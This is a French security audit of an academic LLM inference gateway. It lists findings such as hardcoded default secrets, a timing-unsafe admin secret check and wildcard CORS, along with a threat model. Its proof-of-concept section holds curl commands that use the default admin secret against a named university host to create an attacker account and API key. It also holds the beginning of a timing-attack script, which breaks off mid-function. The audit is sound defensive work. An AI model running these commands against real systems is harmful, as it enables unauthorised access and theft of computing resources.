# Audit de Sécurité — EVA Inference Gateway (UPPA)

> **Projet audité :** EVARuntime — LLM Inference Gateway  
> **Date de l'audit :** 2 avril 2026  
> **Auditrice :** Chercheuse senior en cybersécurité offensive  
> **Contexte :** Projet académique — Université de Pau et des Pays de l'Adour (UPPA)  
> **Périmètre :** Analyse complète du code source, des configurations, des dépendances et de l'architecture  
> **Classification :** Audit de sécurité complet (OWASP, CWE, CVE)

---

## Table des matières

1. [Synthèse exécutive](#1-synthèse-exécutive)
2. [Reconnaissance — Cartographie du projet](#2-reconnaissance--cartographie-du-projet)
3. [Analyse statique — Revue de code](#3-analyse-statique--revue-de-code)
4. [Analyse des dépendances](#4-analyse-des-dépendances)
5. [Analyse de configuration](#5-analyse-de-configuration)
6. [Modélisation des menaces](#6-modélisation-des-menaces)
7. [Exploitation théorique — Preuves de concept](#7-exploitation-théorique--preuves-de-concept)
8. [Recommandations priorisées](#8-recommandations-priorisées)
9. [Matrice de conformité OWASP Top 10 (2021)](#9-matrice-de-conformité-owasp-top-10-2021)
10. [Conclusion](#10-conclusion)

---

## 1. Synthèse exécutive

### Vue d'ensemble

L'EVA Inference Gateway est une passerelle d'inférence LLM auto-hébergée, compatible avec l'API OpenAI, déployée sur un serveur GPU NVIDIA L40S (48 GB VRAM) de l'UPPA. Le projet est de **bonne facture** pour un projet académique, avec une architecture réfléchie et plusieurs bonnes pratiques de sécurité déjà en place.

### Bilan global

| Criticité | Nombre | Description |
|-----------|--------|-------------|
| **Critical** | 1 | Secrets par défaut hardcodés exploitables immédiatement |
| **High** | 4 | SSRF via proxy, comparaison non sécurisée du secret admin, absence de CSRF, path traversal potentiel |
| **Medium** | 6 | XSS stocké via innerHTML, CORS wildcard, absence de rate limit sur /admin, déni de service, token admin en sessionStorage, SQLite en WAL sans chiffrement |
| **Low** | 5 | Information disclosure, absence de Content-Security-Policy, logging excessif, absence de monitoring d'intégrité, version pinning imprécis |
| **Info** | 4 | Bonnes pratiques déjà en place, recommandations de durcissement |

### Bonnes pratiques observées

Le projet implémente déjà plusieurs mesures de sécurité notables :

- **Hachage des clés API** : SHA-256, jamais stockées en clair (CWE-256 mitigé)
- **`yaml.safe_load()`** : Protection contre l'injection YAML/la désérialisation arbitraire
- **Validation des model_id** : Regex stricte `^[a-z0-9][a-z0-9._-]{0,62}$`
- **Validation des chemins modèles** : Chemin absolu obligatoire, extension `.gguf` forcée
- **`ALLOWED_MODEL_DIRS`** : Restriction optionnelle des répertoires autorisés
- **Écriture atomique du YAML** : tmpfile + rename pour éviter la corruption
- **Échappement HTML côté dashboard** : Fonction `esc()` présente
- **Durcissement systemd** : `NoNewPrivileges`, `PrivateTmp`, `ProtectSystem=strict`
- **TLS 1.2+ avec ciphers modernes** dans la configuration nginx
- **HSTS** avec `max-age=31536000`
- **Requêtes SQL paramétrées** : Protection contre l'injection SQL
- **Filtrage IP nginx** pour les routes `/admin/`
- **Rate limiting** double couche (applicatif + nginx)

---

## 2. Reconnaissance — Cartographie du projet

### Stack technique

| Composant | Technologie | Version |
|-----------|------------|---------|
| **Langage** | Python 3.11+ | — |
| **Framework web** | FastAPI | >= 0.115.0 |
| **Serveur ASGI** | Uvicorn + uvloop | >= 0.32.0 |
| **Reverse proxy** | Nginx | — |
| **Base de données** | SQLite (aiosqlite, WAL mode) | >= 0.20.0 |
| **Client HTTP** | httpx (async) | >= 0.27.0 |
| **Configuration** | pydantic-settings + .env | >= 2.0.0 |
| **Registre modèles** | PyYAML + fichier YAML | >= 6.0.0 |
| **CLI admin** | Typer + Rich | >= 0.12.0, >= 13.0.0 |
| **Backend d'inférence** | llama-server (llama.cpp) | externe |
| **GPU** | NVIDIA L40S 48 GB | — |
| **Init system** | systemd | — |
| **TLS** | PKI interne UPPA ou certbot | — |

### Architecture réseau

```
Client (Internet/Campus)
    │
    ▼ HTTPS :443
┌─────────────────────────────┐
│         Nginx               │
│  - TLS termination          │
│  - Rate limit IP-based      │
│  - IP filtering /admin/     │
│  - Proxy buffering off (SSE)│
└────────────┬────────────────┘
             │ HTTP :8000
             ▼
┌─────────────────────────────┐
│    FastAPI Gateway           │
│  - Auth Bearer token         │
│  - Rate limit applicatif     │
│  - Proxy vers llama-server   │
│  - Gestion VRAM / modèles   │
│  - Dashboard admin HTML      │
└────────────┬────────────────┘
             │ HTTP :8081-8085
             ▼
┌─────────────────────────────┐
│    llama-server (×N)         │
│  - Sous-processus asyncio    │
│  - 1 port par modèle chargé │
│  - Internal API key          │
└─────────────────────────────┘
```

### Points d'entrée (surface d'attaque)

| Endpoint | Méthode | Auth | Description |
|----------|---------|------|-------------|
| `/v1/chat/completions` | POST | Bearer API key + rate limit | Inférence chat (streaming SSE) |
| `/v1/completions` | POST | Bearer API key + rate limit | Inférence legacy |
| `/v1/completion`, `/completion` | POST | Bearer API key + rate limit | Endpoint natif llama.cpp |
| `/v1/tokenize` | POST | Bearer API key + rate limit | Tokenisation |
| `/v1/detokenize` | POST | Bearer API key + rate limit | Détokenisation |
| `/v1/models` | GET | Bearer API key | Liste des modèles |
| `/health` | GET | **Aucune** | Health check |
| `/admin/dashboard` | GET | **Aucune** | Dashboard HTML (SPA) |
| `/admin/status` | GET | Admin secret | Statut système |
| `/admin/models` | GET/POST | Admin secret | CRUD modèles |
| `/admin/models/{id}` | PATCH/DELETE | Admin secret | Modification/suppression modèle |
| `/admin/models/{id}/load` | POST | Admin secret | Chargement modèle |
| `/admin/models/{id}/unload` | POST | Admin secret | Déchargement modèle |
| `/admin/unload` | POST | Admin secret | Déchargement total |
| `/admin/users` | GET/POST | Admin secret | CRUD utilisateurs |
| `/admin/users/{username}` | GET/PATCH/DELETE | Admin secret | Gestion utilisateur |
| `/admin/users/{username}/keys` | GET/POST | Admin secret | Gestion clés API |
| `/admin/keys/{prefix}` | DELETE | Admin secret | Révocation clé |
| `/admin/usage` | GET | Admin secret | Journal d'usage |
| `/admin/usage/summary` | GET | Admin secret | Résumé agrégé |
| `/admin/metrics/*` | GET | Admin secret | Métriques dashboard |

### Fichiers sensibles identifiés

| Fichier | Contenu sensible |
|---------|-----------------|
| `/etc/llm-gateway/env` | `INTERNAL_API_KEY`, `ADMIN_SECRET` |
| `/var/lib/llm-gateway/gateway.db` | Hashes des clés API, données utilisateurs, logs d'usage |
| `gateway/config.py:63-64` | Valeurs par défaut des secrets (`CHANGE_ME_*`) |
| `gateway/.env.example:47-48` | Placeholders des secrets |
| `gateway/models.yaml` | Chemins des fichiers modèles sur le serveur |

---

## 3. Analyse statique — Revue de code

### VULN-01 — Secrets par défaut hardcodés (Critical)

**CWE-798 : Use of Hard-coded Credentials**  
**OWASP A07:2021 — Identification and Authentication Failures**

**Fichier :** `gateway/config.py:63-64`

```python
internal_api_key: str = "CHANGE_ME_INTERNAL_KEY"
admin_secret: str = "CHANGE_ME_ADMIN_SECRET"
```

**Problème :** Si le fichier `.env` ou `/etc/llm-gateway/env` n'est pas configuré (ou partiellement rempli), l'application démarre avec des secrets prévisibles. Aucune vérification au démarrage ne force le changement de ces valeurs.

**Impact :** Un attaquant connaissant le code source (projet sur GitHub) peut :
- Accéder à l'API admin avec `CHANGE_ME_ADMIN_SECRET`
- Communiquer directement avec les instances llama-server avec `CHANGE_ME_INTERNAL_KEY`
- Créer des utilisateurs, des clés API, charger/décharger des modèles

**Sévérité : CRITICAL** — Exploitation triviale, accès complet au système.

---

### VULN-02 — Comparaison du secret admin non résistante au timing attack (High)

**CWE-208 : Observable Timing Discrepancy**  
**OWASP A07:2021 — Identification and Authentication Failures**

**Fichier :** `gateway/auth.py:103`

```python
if credentials.credentials != settings.admin_secret:
    raise HTTPException(status_code=403, detail="Secret admin incorrect.")
```

**Problème :** L'opérateur `!=` de Python effectue une comparaison en court-circuit : il s'arrête dès qu'un caractère diffère. Un attaquant peut exploiter les différences de temps de réponse pour deviner le secret admin caractère par caractère.

**Impact :** Extraction progressive du secret admin via des mesures de latence (nécessite des conditions réseau favorables, mais réalisable sur un réseau local campus).

**Sévérité : HIGH** — Le timing attack est plus pratique sur un réseau local (campus UPPA) que sur Internet.

---

### VULN-03 — SSRF via le proxy d'inférence (High)

**CWE-918 : Server-Side Request Forgery (SSRF)**  
**OWASP A10:2021 — Server-Side Request Forgery**

**Fichier :** `gateway/proxy.py:155-160`

```python
async with httpx.AsyncClient(timeout=_INFERENCE_TIMEOUT) as client:
    response = await client.post(
        manager.llama_url(path),
        json=body,
        headers=_INTERNAL_HEADERS,
    )
```

**Et :** `gateway/server_manager.py:104-106`

```python
def llama_url(self, path: str) -> str:
    return f"http://{settings.llama_server_host}:{self._port}{path}"
```

**Problème :** Le paramètre `path` dans `proxy_request()` est construit côté serveur à partir des routes FastAPI (`/v1/chat/completions`, `/completion`, etc.), ce qui limite le vecteur. Cependant, le `body` JSON est forwardé **tel quel** vers llama-server. Si llama-server interprète certains champs de manière inattendue (ex: URL de téléchargement de modèle, callback URL dans certaines extensions), cela pourrait constituer un vecteur SSRF indirect.

De plus, l'`_INTERNAL_HEADERS` contenant la clé interne est injecté dans chaque requête proxy. Si un attaquant parvient à rediriger cette requête (via une vulnérabilité dans llama-server), il récupère la clé interne.

**Impact :** Limité par le fait que `path` est contrôlé côté serveur. Le risque principal est l'exposition de la clé interne en cas de redirection HTTP non gérée.

**Sévérité : HIGH** (potentiel, dépend du comportement de llama-server).

---

### VULN-04 — Path traversal potentiel via l'API admin de modèles (High)

**CWE-22 : Improper Limitation of a Pathname to a Restricted Directory**  
**OWASP A01:2021 — Broken Access Control**

**Fichier :** `gateway/admin.py:78-79`

```python
model_path = Path(body.path)
if not model_path.exists():
    raise HTTPException(...)
```

**Et :** `gateway/model_registry.py:227-258` (validation)

```python
def _validate_model_path(self, raw_path: str) -> Path:
    if not path.is_absolute():
        raise ValueError(...)
    if path.suffix.lower() != ".gguf":
        raise ValueError(...)
    if self._allowed_dirs:
        # Vérification des répertoires autorisés
```

**Problème :** La validation du chemin est correcte **si `ALLOWED_MODEL_DIRS` est configuré**. Cependant :

1. **Par défaut, `ALLOWED_MODEL_DIRS` est vide** (`allowed_model_dirs: list[str] = Field(default_factory=list)`) → aucune restriction de répertoire
2. Même avec la vérification `.gguf`, un attaquant admin pourrait enregistrer un chemin pointant vers un fichier sensible renommé en `.gguf` (ex: `/etc/shadow.gguf` si un lien symbolique est créé)
3. Le `Path(body.path).exists()` vérifie l'existence du fichier → oracle d'existence de fichiers sur le serveur (l'admin peut prober quels fichiers existent)

**Impact :** Un administrateur malveillant (ou un attaquant ayant compromis le secret admin) peut :
- Vérifier l'existence de fichiers arbitraires sur le serveur
- Potentiellement charger un fichier malicieux si les restrictions de répertoire ne sont pas configurées

**Sévérité : HIGH** — Nécessite un accès admin, mais `ALLOWED_MODEL_DIRS` devrait être obligatoire.

---

### VULN-05 — Absence de protection CSRF sur les endpoints admin (High)

**CWE-352 : Cross-Site Request Forgery**  
**OWASP A01:2021 — Broken Access Control**

**Fichier :** `gateway/admin.py` (toutes les routes), `gateway/main.py:126-132`

```python
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["GET", "POST", "PATCH", "DELETE"],
    allow_headers=["Authorization", "Content-Type"],
)
```

**Problème :** 
1. CORS est configuré avec `allow_origins=["*"]` → n'importe quel site peut effectuer des requêtes cross-origin
2. Le dashboard stocke le token admin dans `sessionStorage` et l'envoie via le header `Authorization: Bearer`
3. Si un administrateur visite un site malveillant pendant qu'il est authentifié sur le dashboard, le site pourrait forger des requêtes vers l'API admin

**Atténuation partielle :** Le header `Authorization` est requis (pas de cookies), ce qui limite le vecteur classique de CSRF. Cependant, le `CORS: *` est inutilement permissif.

**Sévérité : HIGH** — Le CORS wildcard est le principal problème.

---

### VULN-06 — XSS stocké potentiel via innerHTML dans le dashboard (Medium)

**CWE-79 : Improper Neutralization of Input During Web Page Generation**  
**OWASP A03:2021 — Injection**

**Fichier :** `gateway/static/dashboard.html` — multiples occurrences d'`innerHTML`

**Analyse détaillée :**

La fonction `esc()` (ligne 1797) est présente et correctement implémentée :
```javascript
function esc(s) { return String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[c]); }
```

Cependant, **tous les usages d'`innerHTML` ne passent pas systématiquement par `esc()`** :

1. **Ligne 1728** — `state.toUpperCase()` est injecté sans échappement dans `innerHTML`:
   ```javascript
   <div class="kpi-value" style="...;color:${stateColor}">${state.toUpperCase()}</div>
   ```
   Le `state` provient de `m.model_state` dans la réponse de l'API. Si un model_id malicieux est enregistré, le state pourrait être manipulé.

2. **Ligne 1971** — Concaténation de `fmtDuration(m.uptime_seconds)` sans échappement dans un template literal injecté via `innerHTML`.

3. **Lignes 1954-1956** — Les model IDs sont passés dans des attributs `onclick` après `esc()`, ce qui est correct. Mais le pattern `onclick="doUnloadModel('${sid}')"` pourrait être contourné si `esc()` ne gère pas correctement les guillemets simples dans un contexte d'attribut HTML (dans ce cas, `&#39;` est correctement géré).

4. **Ligne 2429** — Message d'erreur injecté via `esc()` dans `innerHTML` :
   ```javascript
   list.innerHTML = '<div style="...">' + esc(e.message) + '</div>';
   ```
   C'est correct.

**Impact :** Faible en pratique car les données proviennent de l'API admin (nécessitent déjà un accès admin), et `esc()` est utilisé pour les données utilisateur critiques (username, notes, email). Les cas non protégés concernent des données numériques ou des états internes.

**Sévérité : MEDIUM** — Risque résiduel faible mais pattern dangereux.

---

### VULN-07 — CORS Wildcard en production (Medium)

**CWE-942 : Permissive Cross-domain Policy**  
**OWASP A05:2021 — Security Misconfiguration**

**Fichier :** `gateway/main.py:127-128`

```python
allow_origins=["*"],  # Remplacer par ["https://your-domain.univ-pau.fr"] en production
```

**Problème :** Le commentaire indique que c'est prévu pour être changé en production, mais la valeur par défaut est `*`. Ce n'est pas configurable via `.env`.

**Impact :** Tout site web peut effectuer des requêtes cross-origin vers l'API.

**Sévérité : MEDIUM**

---

### VULN-08 — Absence de rate limiting sur les routes admin (Medium)

**CWE-770 : Allocation of Resources Without Limits or Throttling**  
**OWASP A04:2021 — Insecure Design**

**Fichier :** `gateway/admin.py` — Routes protégées uniquement par le secret admin, sans rate limiting.

**Problème :** Les routes `/admin/*` n'ont aucun rate limiting applicatif. Côté nginx, la zone `api_zone` ne s'applique qu'à `/v1/`. Un attaquant peut tenter un brute-force sur le secret admin sans aucune limitation de débit.

Le `require_admin()` effectue une comparaison directe → pas de lockout, pas de délai exponentiel, pas de log de tentatives échouées au niveau applicatif.

**Impact :** Brute-force facilité du secret admin.

**Sévérité : MEDIUM** — Atténué par le filtrage IP nginx (réseau campus uniquement).

---

### VULN-09 — Déni de service via chargement de modèle (Medium)

**CWE-400 : Uncontrolled Resource Consumption**  
**OWASP A04:2021 — Insecure Design**

**Fichier :** `gateway/model_manager.py:55-118`

**Problème :** Un utilisateur authentifié standard (pas admin) peut déclencher le chargement d'un modèle simplement en envoyant une requête d'inférence avec un `model` spécifique. Si le modèle est gros (42 GB VRAM), cela :
1. Consomme la quasi-totalité du GPU pendant 3 minutes (timeout de chargement)
2. Peut évincer d'autres modèles en service (éviction LRU)
3. Peut causer un déni de service pour les autres utilisateurs

```python
# proxy.py:113
manager = await model_manager.ensure_model_loaded(model_id)
```

**Impact :** Un utilisateur standard peut perturber le service en forçant des chargements/évictions de modèles.

**Sévérité : MEDIUM** — Atténué par le rate limiting (20 req/min) et le nombre limité de modèles.

---

### VULN-10 — Token admin stocké en sessionStorage (Medium)

**CWE-922 : Insecure Storage of Sensitive Information**  
**OWASP A07:2021 — Identification and Authentication Failures**

**Fichier :** `gateway/static/dashboard.html:1413-1424`

```javascript
const TOKEN_KEY = 'eva_admin_token';
let _token = sessionStorage.getItem(TOKEN_KEY) || '';
// ...
sessionStorage.setItem(TOKEN_KEY, _token);
```

**Problème :** Le secret admin est stocké en clair dans `sessionStorage`. Tout script JavaScript exécuté dans le même contexte de navigation peut y accéder. En combinaison avec une vulnérabilité XSS (VULN-06), un attaquant pourrait extraire le secret admin.

**Atténuation :** `sessionStorage` est effacé à la fermeture de l'onglet (contrairement à `localStorage`), ce qui limite la fenêtre d'exploitation.

**Sévérité : MEDIUM**

---

### VULN-11 — Base SQLite sans chiffrement (Medium)

**CWE-311 : Missing Encryption of Sensitive Data**  
**OWASP A02:2021 — Cryptographic Failures**

**Fichier :** `gateway/database.py:81-82`

```python
async with aiosqlite.connect(settings.db_path) as db:
```

**Problème :** La base de données SQLite stocke les hashes des clés API, les emails des utilisateurs, les journaux d'usage complets (modèle utilisé, tokens, IP implicite via user_id, timestamps). Elle n'est pas chiffrée au repos.

**Impact :** En cas d'accès au système de fichiers (compromission du serveur, accès physique, backup non chiffrée), toutes les données sont lisibles en clair. Les hashes SHA-256 des clés API pourraient être attaqués par rainbow table (même si la clé utilise `secrets.token_urlsafe(32)`, le hash SHA-256 sans sel est une mauvaise pratique).

**Sévérité : MEDIUM** — Les données sont protégées par les permissions fichier (750) et le durcissement systemd.

---

### VULN-12 — Hachage SHA-256 sans sel pour les clés API (Medium)

**CWE-916 : Use of Password Hash With Insufficient Computational Effort**

**Fichier :** `gateway/database.py:114-115`

```python
def hash_key(raw_key: str) -> str:
    return hashlib.sha256(raw_key.encode()).hexdigest()
```

**Problème :** Le hachage SHA-256 est utilisé sans sel (salt). SHA-256 est un hash cryptographique rapide, pas un KDF (Key Derivation Function). Cependant, dans ce cas spécifique, les clés API sont générées avec `secrets.token_urlsafe(32)` (256 bits d'entropie), ce qui rend le brute-force impraticable.

**Impact :** Très faible en pratique grâce à l'entropie des clés. Mais c'est un écart par rapport aux bonnes pratiques (HMAC-SHA256 ou BLAKE2b avec sel serait préférable).

**Sévérité : MEDIUM (théorique)** — Non exploitable en pratique.

---

### VULN-13 — Divulgation d'informations via /health et messages d'erreur (Low)

**CWE-200 : Exposure of Sensitive Information to an Unauthorized Actor**  
**OWASP A01:2021 — Broken Access Control**

**Fichier :** `gateway/main.py:167-177`

```python
@app.get("/health", include_in_schema=False)
async def health():
    status = model_manager.status()
    loaded = [m["id"] for m in status["models"] if m["state"] == "ready"]
    return {
        "status": "ok",
        "models_loaded": loaded,
        "vram_used_gb": status["vram_budget"]["used_gb"],
        "vram_available_gb": status["vram_budget"]["available_gb"],
    }
```

**Problème :** L'endpoint `/health` est accessible sans authentification et divulgue :
- Les noms des modèles chargés
- L'utilisation VRAM (révèle la capacité GPU)
- Le nombre de modèles en service

De même, l'endpoint `/admin/dashboard` (GET) sert le HTML du dashboard sans authentification. L'authentification est faite côté JavaScript, ce qui expose le code source du dashboard.

**Impact :** Reconnaissance facilitée pour un attaquant.

**Sévérité : LOW**

---

### VULN-14 — Absence de Content-Security-Policy (Low)

**CWE-1021 : Improper Restriction of Rendered UI Layers**  
**OWASP A05:2021 — Security Misconfiguration**

**Fichier :** `gateway/deploy/nginx.conf:44-46`

```nginx
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
add_header X-Content-Type-Options nosniff always;
add_header X-Frame-Options DENY always;
```

**Problème :** Les headers de sécurité HTTP sont partiellement implémentés. Manquent :
- `Content-Security-Policy` — critique pour le dashboard SPA
- `X-XSS-Protection: 0` (ou CSP) — le header legacy X-XSS-Protection ne devrait plus être utilisé, mais une CSP stricte le remplace
- `Referrer-Policy: strict-origin-when-cross-origin`
- `Permissions-Policy`

Le dashboard charge des ressources externes (Google Fonts, Chart.js depuis CDN) sans intégrité SRI :
```html
<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.4/dist/chart.umd.min.js"></script>
```

Un compromission du CDN jsdelivr permettrait l'injection de code malveillant dans le dashboard admin.

**Sévérité : LOW** — Le dashboard est déjà protégé par le filtrage IP.

---

### VULN-15 — Logging potentiellement excessif (Low)

**CWE-532 : Insertion of Sensitive Information into Log File**

**Fichier :** `gateway/server_manager.py:197`

```python
log.info("Lancement llama-server '%s' : %s", self._model.id, " ".join(cmd))
```

**Problème :** La commande de lancement de llama-server est loggée **avec la clé API interne** (`--api-key` est dans les arguments) :

```python
# model_registry.py:117
"--api-key", internal_api_key,
```

**Impact :** La clé interne est visible dans les logs journald et dans les fichiers de log.

**Sévérité : LOW**

---

### VULN-16 — Absence de validation de la date d'expiration des clés (Low)

**CWE-20 : Improper Input Validation**

**Fichier :** `gateway/schemas.py:49-56`

```python
@field_validator("expires_at", mode="before")
@classmethod
def validate_expiry(cls, v: object) -> str | None:
    if v is None:
        return None
    if isinstance(v, datetime):
        return v.isoformat()
    return str(v)
```

**Problème :** Aucune validation que `expires_at` est une date ISO 8601 valide. Un administrateur peut passer n'importe quelle chaîne (ex: `"never"`, `"999999"`). La comparaison dans `lookup_key()` (`database.py:240`) fait une comparaison lexicographique avec `datetime.now(tz).isoformat()`, qui fonctionnera correctement si la chaîne est ISO 8601 mais produira des résultats imprévisibles sinon.

**Sévérité : LOW** — L'admin est de confiance.

---

### VULN-17 — Révocation de clé par préfixe avec LIKE (Low)

**CWE-20 : Improper Input Validation**

**Fichier :** `gateway/database.py:249-253`

```python
async def revoke_key(key_prefix: str) -> bool:
    async with get_db() as db:
        cursor = await db.execute(
            "UPDATE api_keys SET is_active = 0 WHERE key_prefix LIKE ?",
            (key_prefix + "%",),
        )
```

**Problème :** L'utilisation de `LIKE` avec un préfixe fourni par l'utilisateur peut révoquer plus de clés que prévu si le préfixe contient des caractères SQL LIKE (`%`, `_`). Par exemple, passer `%` comme préfixe révoquerait **toutes les clés**.

De plus, le préfixe n'est pas validé — un appel à `DELETE /admin/keys/%` révoquerait toutes les clés du système.

**Sévérité : LOW** — Nécessite un accès admin.

---

## 4. Analyse des dépendances

### Audit pip-audit

```
$ pip-audit -r gateway/requirements.txt --desc
No known vulnerabilities found
```

**Résultat :** Aucune CVE connue dans les versions spécifiées des dépendances au 2 avril 2026.

### Analyse des versions spécifiées

| Dépendance | Version requise | Risque | Note |
|-----------|----------------|--------|------|
| `fastapi` | `>=0.115.0,<1.0.0` | Faible | Borne supérieure correcte |
| `uvicorn[standard]` | `>=0.32.0` | Faible | Pas de borne supérieure |
| `httpx` | `>=0.27.0` | Faible | Pas de borne supérieure |
| `aiosqlite` | `>=0.20.0` | Faible | Pas de borne supérieure |
| `pydantic-settings` | `>=2.0.0` | Faible | Pas de borne supérieure |
| `pyyaml` | `>=6.0.0` | Faible | Pas de borne supérieure |
| `typer` | `>=0.12.0` | Faible | Pas de borne supérieure |
| `rich` | `>=13.0.0` | Faible | Pas de borne supérieure |

**Recommandation :** Ajouter des bornes supérieures (`<X.0.0`) pour toutes les dépendances afin d'éviter les mises à jour majeures non testées, ou utiliser un fichier `requirements.lock` avec des versions épinglées.

### Dépendances CDN du dashboard

| Ressource | Version | Intégrité SRI |
|-----------|---------|---------------|
| Chart.js | 4.4.4 | **Absente** |
| Google Fonts (Inter, JetBrains Mono) | Latest | **Absente** |

**Risque :** Supply chain attack via CDN. Si `cdn.jsdelivr.net` est compromis, du code malveillant peut être injecté dans le dashboard admin.

---

## 5. Analyse de configuration

### Analyse du fichier .env.example

| Variable | Valeur par défaut | Risque | Recommandation |
|----------|------------------|--------|----------------|
| `INTERNAL_API_KEY` | `CHANGE_ME_INTERNAL_KEY_BETWEEN...` | **CRITICAL** | Forcer le changement au démarrage |
| `ADMIN_SECRET` | `CHANGE_ME_ADMIN_SECRET_FOR...` | **CRITICAL** | Forcer le changement au démarrage |
| `ALLOWED_MODEL_DIRS` | (vide) | **HIGH** | Configurer obligatoirement |
| `GATEWAY_HOST` | `127.0.0.1` | OK | Correct, écoute locale uniquement |
| `LLAMA_SERVER_HOST` | `127.0.0.1` | OK | Correct |
| `DEFAULT_RPM_LIMIT` | `20` | OK | Raisonnable |
| `DEFAULT_MONTHLY_TOKEN_LIMIT` | `0` (illimité) | **MEDIUM** | Définir un quota par défaut |

### Analyse du service systemd

| Directive | Valeur | Évaluation |
|-----------|--------|------------|
| `NoNewPrivileges` | `true` | **Excellent** |
| `PrivateTmp` | `true` | **Excellent** |
| `ProtectSystem` | `strict` | **Excellent** |
| `ReadWritePaths` | `/var/lib/llm-gateway /var/log/llm-gateway /models /data/models` | OK |
| `User` | `llmservice` (sans login shell) | **Excellent** |
| `ProtectHome` | absent | Acceptable (user système sans home) |
| `CapabilityBoundingSet` | absent | **À ajouter** |
| `SystemCallFilter` | absent | **À ajouter** |
| `ProtectKernelTunables` | absent | **À ajouter** |
| `ProtectKernelModules` | absent | **À ajouter** |

### Analyse de la configuration nginx

| Aspect | Évaluation | Note |
|--------|------------|------|
| TLS 1.2+ | **Excellent** | `ssl_protocols TLSv1.2 TLSv1.3` |
| Ciphers | **Bon** | Suite moderne AEAD |
| HSTS | **Excellent** | 1 an, includeSubDomains |
| X-Frame-Options | **Bon** | DENY |
| X-Content-Type-Options | **Bon** | nosniff |
| CSP | **Absent** | À ajouter |
| Rate limit /v1/ | **Bon** | 60r/m + burst 10 |
| Rate limit /admin/ | **Absent** | À ajouter |
| IP filtering /admin/ | **Bon** | Réseaux privés RFC1918 |
| Proxy buffering SSE | **Excellent** | Correctement désactivé |
| OCSP Stapling | **Absent** | À ajouter |

### Analyse des pragmas SQLite

```sql
PRAGMA journal_mode = WAL;        -- Bon : concurrence lecture/écriture
PRAGMA synchronous  = NORMAL;     -- Attention : risque de perte de données en cas de crash OS
PRAGMA cache_size   = -65536;     -- 64 MB de cache : adéquat
PRAGMA foreign_keys = ON;         -- Bon : intégrité référentielle
PRAGMA temp_store   = MEMORY;     -- OK pour les performances
```

**Risque :** `synchronous = NORMAL` + `journal_mode = WAL` peut perdre les dernières transactions en cas de crash du système d'exploitation (pas du processus). Pour un projet académique, c'est acceptable.

---

## 6. Modélisation des menaces

### Acteurs de menace

| Acteur | Motivation | Capacité | Vecteur d'accès |
|--------|-----------|----------|-----------------|
| **Étudiant curieux** | Exploration, abus du quota | Basse | Clé API légitime |
| **Étudiant malveillant** | DoS, exfiltration de données, abus de ressources GPU | Moyenne | Clé API + connaissances techniques |
| **Attaquant externe** | Vol de ressources GPU, crypto-mining, utilisation de l'API LLM | Haute | Internet, brute-force, exploitation de vulnérabilités |
| **Admin compromis** | Exfiltration complète | Très haute | Accès admin + accès serveur |
| **Insider (personnel UPPA)** | Accès non autorisé | Moyenne | Réseau campus |

### Scénarios de menace prioritaires

```
┌─────────────────────────────────────────────────────────────┐
│               ARBRE D'ATTAQUE PRINCIPAL                      │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  Objectif : Accès complet à la gateway LLM                  │
│                                                              │
│  ├── [1] Exploiter les secrets par défaut (VULN-01)         │
│  │   └── Accès admin si .env non configuré                  │
│  │                                                           │
│  ├── [2] Brute-force du secret admin                        │
│  │   ├── Via timing attack (VULN-02)                        │
│  │   └── Pas de rate limit sur /admin/ (VULN-08)            │
│  │                                                           │
│  ├── [3] Compromission via supply chain CDN (VULN-14)       │
│  │   └── Injection JS dans le dashboard                     │
│  │       └── Vol du token admin (sessionStorage)            │
│  │                                                           │
│  ├── [4] DoS via chargement de modèle (VULN-09)            │
│  │   └── Utilisateur standard → modèle 42 GB → 3 min       │
│  │                                                           │
│  └── [5] Abus du quota illimité par défaut                  │
│      └── DEFAULT_MONTHLY_TOKEN_LIMIT=0                      │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### Matrice des risques

| Menace | Probabilité | Impact | Risque |
|--------|------------|--------|--------|
| Exploitation des secrets par défaut | Élevée | Critique | **Critique** |
| Brute-force admin secret | Moyenne | Élevé | **Élevé** |
| DoS via chargement modèle | Élevée | Moyen | **Moyen** |
| Abus de quota | Élevée | Moyen | **Moyen** |
| XSS stocké → vol token admin | Faible | Élevé | **Moyen** |
| SSRF via proxy | Faible | Élevé | **Moyen** |
| Supply chain CDN | Très faible | Critique | **Faible** |

---

## 7. Exploitation théorique — Preuves de concept

### PoC-01 : Exploitation des secrets par défaut

**Prérequis :** Le fichier `.env` n'a pas été configuré (ou l'application a été lancée en développement sans `.env`).

```bash
# 1. Vérifier si les secrets par défaut sont actifs
curl -s https://llm.eva.univ-pau.fr/admin/status \
  -H "Authorization: Bearer CHANGE_ME_ADMIN_SECRET" \
  | python3 -m json.tool

# 2. Si succès → créer un utilisateur et une clé API
curl -s -X POST https://llm.eva.univ-pau.fr/admin/users \
  -H "Authorization: Bearer CHANGE_ME_ADMIN_SECRET" \
  -H "Content-Type: application/json" \
  -d '{"username": "attacker", "email": "attacker@evil.com"}'

# 3. Générer une clé API pour l'utilisateur
curl -s -X POST https://llm.eva.univ-pau.fr/admin/users/attacker/keys \
  -H "Authorization: Bearer CHANGE_ME_ADMIN_SECRET" \
  -H "Content-Type: application/json" \
  -d '{"name": "pwned"}'
# → Récupérer la raw_key dans la réponse

# 4. Utiliser le GPU de l'UPPA gratuitement
curl -X POST https://llm.eva.univ-pau.fr/v1/chat/completions \
  -H "Authorization: Bearer <CLÉ_VOLÉE>" \
  -H "Content-Type: application/json" \
  -d '{
    "model": "llama-3.3-70b-instruct",
    "messages": [{"role": "user", "content": "Generate malicious content..."}]
  }'
```

**Résultat attendu :** Accès complet — création d'utilisateurs, utilisation du GPU, accès aux données d'usage de tous les utilisateurs.

---

### PoC-02 : Timing attack sur le secret admin

```python
import time
import httpx
import statistics

TARGET = "https://llm.eva.univ-pau.fr/admin/status"
CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-"
SAMPLES = 50

def measure_time(secret_guess: str) -> float:
    """Mesure le temps de réponse pour une tentative de secret."""
    times = []
    for _ in range(SAMPLES):
        start = time.perf_counter_ns()
        try:
            httpx.get(
                TARGET,
                headers={"Authorization": f"Bearer {secret_guess}"},
                timeout=5.0,
            )
        except Exception:
            pass
        elapsed = time.perf_counter_ns() - start
        times.append(elapsed)
